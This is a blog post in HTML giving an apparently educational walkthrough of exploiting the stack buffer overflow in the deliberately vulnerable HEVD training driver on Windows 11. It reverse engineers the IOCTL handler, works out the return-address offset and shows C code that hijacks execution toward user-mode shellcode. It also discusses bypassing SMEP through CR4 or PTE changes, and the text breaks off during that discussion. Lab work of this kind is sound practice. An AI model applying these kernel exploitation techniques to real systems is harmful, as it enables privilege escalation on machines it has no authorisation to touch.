<!doctype html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Exploiting HEVD Stack Buffer Overflow — Windows 11 x64" /><meta name="author" content="B4shCr00k" /><meta property="og:locale" content="en" /><meta name="description" content="In this guide, I will exploit the HackSys Extreme Vulnerable Driver. Specifically, we will target the stack buffer overflow vulnerability on Windows 11 Build 24H2. I will explain everything you need to understand how this exploit works, but you should already have at least the following knowledge:" /><meta property="og:description" content="In this guide, I will exploit the HackSys Extreme Vulnerable Driver. Specifically, we will target the stack buffer overflow vulnerability on Windows 11 Build 24H2. I will explain everything you need to understand how this exploit works, but you should already have at least the following knowledge:" /><link rel="canonical" href="https://b4shcr00k.github.io/R4vensP1t/posts/Exploiting-HEVD-StackBufferOverflow/" /><meta property="og:url" content="https://b4shcr00k.github.io/R4vensP1t/posts/Exploiting-HEVD-StackBufferOverflow/" /><meta property="og:site_name" content="B4shCr00k" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2025-08-28T16:43:03+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Exploiting HEVD Stack Buffer Overflow — Windows 11 x64" /><meta name="twitter:site" content="@B4shCr00k" /><meta name="twitter:creator" content="@B4shCr00k" /><meta name="google-site-verification" content="4fZ4QeNIQlHSKga_GWnQHdiLByGCYC5BLUaRlUqEA3w" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"B4shCr00k"},"dateModified":"2025-08-28T16:43:03+00:00","datePublished":"2025-08-28T16:43:03+00:00","description":"In this guide, I will exploit the HackSys Extreme Vulnerable Driver. Specifically, we will target the stack buffer overflow vulnerability on Windows 11 Build 24H2. I will explain everything you need to understand how this exploit works, but you should already have at least the following knowledge:","headline":"Exploiting HEVD Stack Buffer Overflow — Windows 11 x64","mainEntityOfPage":{"@type":"WebPage","@id":"https://b4shcr00k.github.io/R4vensP1t/posts/Exploiting-HEVD-StackBufferOverflow/"},"url":"https://b4shcr00k.github.io/R4vensP1t/posts/Exploiting-HEVD-StackBufferOverflow/"}</script><title>Exploiting HEVD Stack Buffer Overflow --- Windows 11 x64 | B4shCr00k</title><link rel="apple-touch-icon" sizes="180x180" href="/R4vensP1t/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/R4vensP1t/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/R4vensP1t/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/R4vensP1t/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/R4vensP1t/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="B4shCr00k"><meta name="application-name" content="B4shCr00k"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/R4vensP1t/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/R4vensP1t/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script src="/R4vensP1t/assets/js/dist/theme.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script> <script defer src="/R4vensP1t/assets/js/dist/post.min.js"></script> <script defer src="/R4vensP1t/app.min.js?baseurl=/R4vensP1t&register=true" ></script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/R4vensP1t/" id="avatar" class="rounded-circle"><img src="/R4vensP1t/assets/img/noice.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a> <a class="site-title d-block" href="/R4vensP1t/">B4shCr00k</a><p class="site-subtitle fst-italic mb-0">Endless pursuit of knowledge.</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/R4vensP1t/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/R4vensP1t/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/R4vensP1t/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/R4vensP1t/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/R4vensP1t/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/B4shCr00k" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/B4shCr00k" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fa-brands fa-x-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['example','domain.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/R4vensP1t/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/R4vensP1t/">Home</a> </span> <span>Exploiting HEVD Stack Buffer Overflow --- Windows 11 x64</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link" aria-label="Search"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><header><h1 data-toc-skip>Exploiting HEVD Stack Buffer Overflow --- Windows 11 x64</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1756399383" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Aug 28, 2025 </time> </span><div class="d-flex justify-content-between"> <span> By <em> B4shCr00k </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="4874 words" > <em>27 min</em> read</span></div></div></div></header><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">Exploiting HEVD Stack Buffer Overflow --- Windows 11 x64</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div class="header d-flex flex-row align-items-center justify-content-between"><div class="label text-truncate py-2 ms-4">Exploiting HEVD Stack Buffer Overflow --- Windows 11 x64</div><button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75"> <i class="fas fa-close"></i> </button></div><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><p>In this guide, I will exploit the HackSys Extreme Vulnerable Driver. Specifically, we will target the stack buffer overflow vulnerability on Windows 11 Build 24H2. I will explain everything you need to understand how this exploit works, but you should already have at least the following knowledge:</p><p>We will go as blindly as possible, ignoring the driver’s source code and focusing mainly on reverse engineering it.</p><h1 id="this-guide-will-cover">This Guide Will Cover</h1><ul><li><p>Prerequisites</p><li><p>How To Communicate With A driver From usermode</p><li><p>Gathering Informations</p><li><p>Hijacking The Execution Flow</p><li><p>Security Measures</p><li><p>Bypassing KASLR</p><li><p>Bypassing SMEP</p><li><p>Writing The Shellcode</p><li><p>Full Exploit</p><li><p>References</p></ul><h2 id="prequesites"><span class="me-2">Prequesites</span><a href="#prequesites" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li>C language and x64 Assembly<li>Basic reverse engineering skills<li>Some understanding on windows internals<li>Basic Binary exploitation understanding (buffer overflows)</ul><h2 id="how-to-communicate-with-a-driver-from-usermode"><span class="me-2">How To Communicate With A driver From usermode</span><a href="#how-to-communicate-with-a-driver-from-usermode" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>A usermode Program sends a recieves data from a Driver using something called IOCTLS Input/Output Control Code Which is a request the usermode program sends to a driver using</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="n">BOOL</span> <span class="nf">DeviceIoControl</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>                <span class="n">HANDLE</span>       <span class="n">hDevice</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>                <span class="n">DWORD</span>        <span class="n">dwIoControlCode</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>      <span class="n">LPVOID</span>       <span class="n">lpInBuffer</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>                <span class="n">DWORD</span>        <span class="n">nInBufferSize</span><span class="p">,</span>
  <span class="p">[</span><span class="n">out</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>     <span class="n">LPVOID</span>       <span class="n">lpOutBuffer</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>                <span class="n">DWORD</span>        <span class="n">nOutBufferSize</span><span class="p">,</span>
  <span class="p">[</span><span class="n">out</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>     <span class="n">LPDWORD</span>      <span class="n">lpBytesReturned</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">LPOVERLAPPED</span> <span class="n">lpOverlapped</span>
<span class="p">);</span>
</pre></table></code></div></div><p>As you can see it takes 8 params A handle to driver we want to communicate with a <code class="language-plaintext highlighter-rouge">dwIoControlCode</code>which is a unique identifier defined inside the driver that tells it what to do for example if it recieves <code class="language-plaintext highlighter-rouge">dwIoControlCode</code> number 1 Do something and its all defined inside a switch statement in the driver then we need an in and out buffer both are optional but incase the driver needs a information then sends back information you need to provide the data to send and where to recieve the data sent back by the driver so now if we want to communicate with our HEVD driver we will need the <code class="language-plaintext highlighter-rouge">dwIoControlCode</code> usually you have two options whether you try to fuzz it since most of the times devs use ioctl codes that start from 0x800 so you can fuzz a 100 codes and see if you get any exceptions or errors that tells us that we indeed sent a valid ioctl code, or we can simply reverse engineer the driver and look inside the <code class="language-plaintext highlighter-rouge">DeviceIoctlHandler()</code> routine to see how it handles incoming ioctls where we can also get the exact ioctlcodes</p><h2 id="gathering-informations"><span class="me-2">Gathering Informations</span><a href="#gathering-informations" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Now this is a very important part where we reverse engineer the driver and try to get as many infos about it as possible first we are targeting the stack buffer overflow vuln in our case the driver ruins all the fun because of the strings since every vuln is inside a function with the vulnribility name before that lets get the ioctl code for our function</p><p><a href="/R4vensP1t/assets/img/functions.png" class="popup img-link shimmer"><img src="/R4vensP1t/assets/img/functions.png" alt="The Function Name" loading="lazy"></a> As you can see here is the name of our function inside the driver now the driver will call this function if it recieves an ioctl with a spesific code we need to find this code</p><p><a href="/R4vensP1t/assets/img/devicecntrl.png" class="popup img-link shimmer"><img src="/R4vensP1t/assets/img/devicecntrl.png" alt="The Function Name" loading="lazy"></a> we find this function which inside drivers handles the IOCTLS sent by the user</p><p><a href="/R4vensP1t/assets/img/graph.png" class="popup img-link shimmer"><img src="/R4vensP1t/assets/img/graph.png" alt="The Function Name" loading="lazy"></a> as you can see in ida’s graph view we can immedieatly know that this is what we are looking for since it has a lot of branches which is how a switch statement should look (as i said the ioctl codes are handled using a switch statement) <a href="/R4vensP1t/assets/img/ourfunction.png" class="popup img-link shimmer"><img src="/R4vensP1t/assets/img/ourfunction.png" alt="The Function Name" loading="lazy"></a> after some looking we find this snippet that has a string in it called <code class="language-plaintext highlighter-rouge">aHevdIoctlBuffe_1 db '****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******',0Ah,0</code> which is what we are looking for !</p><p><a href="/R4vensP1t/assets/img/true.png" class="popup img-link shimmer"><img src="/R4vensP1t/assets/img/true.png" alt="The Function Name" loading="lazy"></a> by following the true statement that led to our previous function we get here and as you can see it is exactly what we are looking for 0x22203 this is our ioctl code ! or it is contained withing it since ioctl codes don’t just contain the unique identifier that decided what operation the driver should do it also has more informations</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>#define CTL_CODE(DeviceType, Function, Method, Access) \
    (((DeviceType) &lt;&lt; 16) | ((Access) &lt;&lt; 14) | ((Function) &lt;&lt; 2) | (Method))

</pre></table></code></div></div><p>1) DeviceType (16 bits) Identifies the type of device (e.g., FILE_DEVICE_UNKNOWN, FILE_DEVICE_DISK). Example: 0x22 for a custom driver.</p><p>2) Function (12 bits) Unique number that tells the driver which function/operation you want. Example: 0x803 might correspond to “trigger stack overflow”.</p><p>3) Method (2 bits) Defines how data is passed between user mode and kernel mode:</p><ul><li><p>METHOD_BUFFERED</p><li><p>METHOD_IN_DIRECT</p><li><p>METHOD_OUT_DIRECT</p><li><p>METHOD_NEITHER</p></ul><p>4) Access (2 bits) Specifies required access rights:</p><ul><li><p>FILE_ANY_ACCESS</p><li><p>FILE_READ_ACCESS</p><li><p>FILE_WRITE_ACCESS</p></ul><p>now when we pass the full ioctl to the driver’s <code class="language-plaintext highlighter-rouge">DispatchDeviceControl</code> routine inside the driver you would find something like this</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="n">NTSTATUS</span> <span class="nf">DriverDeviceControl</span><span class="p">(</span><span class="n">PDEVICE_OBJECT</span> <span class="n">DeviceObject</span><span class="p">,</span> <span class="n">PIRP</span> <span class="n">Irp</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">PIO_STACK_LOCATION</span> <span class="n">irpSp</span> <span class="o">=</span> <span class="n">IoGetCurrentIrpStackLocation</span><span class="p">(</span><span class="n">Irp</span><span class="p">);</span>
    <span class="n">ULONG</span> <span class="n">IoControlCode</span> <span class="o">=</span> <span class="n">irpSp</span><span class="o">-&gt;</span><span class="n">Parameters</span><span class="p">.</span><span class="n">DeviceIoControl</span><span class="p">.</span><span class="n">IoControlCode</span><span class="p">;</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">IoControlCode</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">case</span> <span class="n">IOCTL_STACK_OVERFLOW</span><span class="p">:</span>
            <span class="c1">// handle stack overflow</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="n">IOCTL_ARBITRARY_OVERWRITE</span><span class="p">:</span>
            <span class="c1">// handle arbitrary overwrite</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="c1">// ...</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>what we need to do now is know what function code is in 0x222003, you can just ask chatgpt to do the math for you (not really math you just need to write it in binary and split it into the parts i mentioned previously to get the function code) we get function code number 0x800</p><p>Perfect ! now we got our function code and we are ready to send our ioctl into the driver from a usermode program (soon will be an exploit)</p><p>first we get a handle to the driver</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver",
    GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (hDriver == INVALID_HANDLE_VALUE)
{
    printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
    return 1;
}
</pre></table></code></div></div><p>then we call <code class="language-plaintext highlighter-rouge">DeviceIoControl(hDriver, 0x222003, NULL, 0, NULL, 0, NULL, NULL);</code> here we are sending nothing but we will send a payload later</p><p>this is how we will be testing out the driver from user mode now lets get into the exploitation part</p><p><a href="/R4vensP1t/assets/img/vuln.png" class="popup img-link shimmer"><img src="/R4vensP1t/assets/img/vuln.png" alt="The Function Name" loading="lazy"></a></p><p>so lets go line by line here since i think its the best way to understand whats going on, before we do that lets recall our goal since its easy to get lost when reverse engineering without a goal.</p><p>our goal here is to identify the vulnerability or the vulnerable function call being used.</p><p>as you can see in the picture we have a variable called KernelBuffer that lives 818h bytes below the stack pointer (rsp) lets not get deeper into the variables just yet and try to find out where the vulnerability exactly is.</p><p>so what we are looking for are <code class="language-plaintext highlighter-rouge">call</code> instructions, inside the function we find two interesting call instruction first is <code class="language-plaintext highlighter-rouge">call memset</code> and second is <code class="language-plaintext highlighter-rouge">call memmove</code> which is a known patters we first allocate space in the stack we fill it with something using memset then we move some data into the allocated space so first we need to understand how the memset function is being called,what i mean by that is knowing exactly what the stack layout is when its being called then we can see whats actually being moved using memmove and ofc we can guess its the buffer sent from usermode.</p><p>IMPORTANT NOTE:</p><p>you can just inject a pattern generated by the metasploit framework and then locate exactly where rip gets overwritten but i think its much more fun to do all the calculations then see if it turns out to be right</p><p>First we have this part</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>KernelBuffer= dword ptr -818h
var_18= byte ptr -18h
arg_0= qword ptr  8
arg_8= qword ptr  10h
arg_10= qword ptr  18h

UserBuffer = rcx
Size = rdx
</pre></table></code></div></div><p>where ida shows us the variables being used in the function, we have KernelBuffer -818h means 818h bytes below the stack pointer then we have var_18 18h bytes below the stack pointer then we have a bunch of variables above the stack pointer we don’t care about those for now, then we have rcx which has kernelbuffer and rdx which is size these are the windows x64 calling convention where the first param when calling a function goes into rcx the second into rdx the third into r8 we will need this later</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>mov     [rsp+arg_0], rbx
mov     [rsp+arg_8], rsi
mov     [rsp+arg_10], rdi
push    r12
push    r14
push    r15
sub     rsp, 820h
mov     rsi, Size
mov     rdi, UserBuffer
xor     ebx, ebx
mov     r12d, 800h
mov     r8d, r12d       ; Size
xor     edx, edx        ; Val
lea     UserBuffer, [rsp+838h+KernelBuffer] ; void *
call    memset
nop
</pre></table></code></div></div><p>it starts with moving some variables into their allocated space</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>mov     [rsp+arg_0], rbx
mov     [rsp+arg_8], rsi
mov     [rsp+arg_10], rdi
</pre></table></code></div></div><p>these are above rsp again we don’t care about these for now</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>push    r12
push    r14
push    r15
</pre></table></code></div></div><p>next we have 3 registers since we are in x64 each register is 64 bit long (8 bytes) this part is important since by pushing a register we are moving the rsp so we move it by 8*3 which is 24 now we are 24 bytes below rsp (-24 or 18h)</p><p>then we allocate 820h bytes in the stack using the sub instruction <code class="language-plaintext highlighter-rouge">sub rsp, 820h</code> so now rsp is 820h + 18h so 838h below the initial rsp</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>mov     rsi, Size
mov     rdi, UserBuffer
</pre></table></code></div></div><p>here we are saving rcx and rdx before using them (Size is rdx and UserBuffer is rcx)</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>xor     ebx, ebx
mov     r12d, 800h
mov     r8d, r12d       ; Size
xor     edx, edx        ; Val
lea     UserBuffer, [rsp+838h+KernelBuffer] ; void *
call    memset
</pre></table></code></div></div><p>here comes the x64 calling convention we said that the first param goes into rcx the second into rdx and the third into r8 which is whats happening here we are calling memset where the first argument is rsp+838h+KernelBuffer the second one is 0 since we xored edx and finally the third one is 800h so we are writing 800h of zeroes into rsp+838h+KernelBuffer so we need to understand what that actually means</p><p>when the lea instruction is called we know that rsp is 838h below the initial rsp so it is -838h we have -838+838h+KernelBuffer so basically whats happening here is cancelling the 838h bytes in order to only have KernelBuffer which lives 818h below rsp or we have rsp+838h+KernelBuffer = rsp + 838h - 818h = rsp + 20h.</p><p>Perfect ! now we know how our stack layout</p><p><a href="/R4vensP1t/assets/img/stack.png" class="popup img-link shimmer"><img src="/R4vensP1t/assets/img/stack.png" alt="The Function Name" loading="lazy"></a></p><p>Perfect ! now we know how our stack layout</p><h2 id="hijacking-the-execution-flow"><span class="me-2">Hijacking The Execution Flow</span><a href="#hijacking-the-execution-flow" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><a href="/R4vensP1t/assets/img/1.png" class="popup img-link shimmer"><img src="/R4vensP1t/assets/img/1.png" alt="The Function Name" loading="lazy"></a></p><p>As you can see here we have the second call which is to memmove where we write memory and where the vulnrebility is, it moves our user mode buffer into the kernel buffer which is 800h bytes big so what we need to do is first write the entire buffer then write the 8 pushed registers and then 8 more to overwrite rip so 800h + 18h = 818h = 2027 and thats exactly where rip is</p><p>we can use msf-pattern_create to create a pattern to know exactly where rip is</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>msf-pattern_create -l 3000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8...
</pre></table></code></div></div><p>we store the pattern inside a buffer and send it to the driver then using windbg</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>1: kd&gt; dq rsp
</pre></table></code></div></div><p>the last byte is rip so you can try this on your own get the last byte the run it on</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>msf-pattern_offset
</pre></table></code></div></div><p>and you will get the exact 2027 we got well the offset maybe a bit off but you can fix that on your own</p><p>now we managed to overwrite rip and cause a dos attack but thats not what we want, we want to hijack the execution flow and make the driver execute a usermode shellcode so here i have a simple shellcode thats just a bunch of nops</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>    LPVOID buf = VirtualAlloc(NULL, 3000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    LPVOID shellcode = VirtualAlloc(NULL, 500, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memset(buf, 0x41, 3000);
    memset(shellcode,0x90,500);
    QWORD((QWORD)buf + 2072) = (QWORD)shellcode;
</pre></table></code></div></div><p>nice now we send the buffer and see</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>*** Fatal System Error: 0x000000fc
</pre></table></code></div></div><p>Oops !</p><p>Fatal system error well this is expected since executing usermode shellcode is not allowed because of SMEP</p><h2 id="security-measures"><span class="me-2">Security Measures</span><a href="#security-measures" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="smep"><span class="me-2">SMEP</span><a href="#smep" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p><a href="/R4vensP1t/assets/img/gpt1.png" class="popup img-link shimmer"><img src="/R4vensP1t/assets/img/gpt1.png" alt="The Function Name" loading="lazy"></a></p><p>as you can see SMEP is not letting us execute shellcode we allocated in our program memory which sucks but lucky for us there are two ways to bypass it</p><p>Methode 1:</p><p>What we will do is change the 20th bit in the CR4 Register this bit controls SMEP if we can set it to 0 we disable it and we can execute shellcode from usermode, in this methode we can use rop gadgets in order to change the bit or we need another vulnerability to do so but usually since we are in kernel mode rop is the way and i will explain why later since this is the method we will use</p><p>Methode 2:</p><p>this technique is more modern what we do is get the PTE address of our shellcode in memory in order to change the 2nd bit which marks our shellcode as a Kernel page therefore it will allow us to execute shellcode ,<a 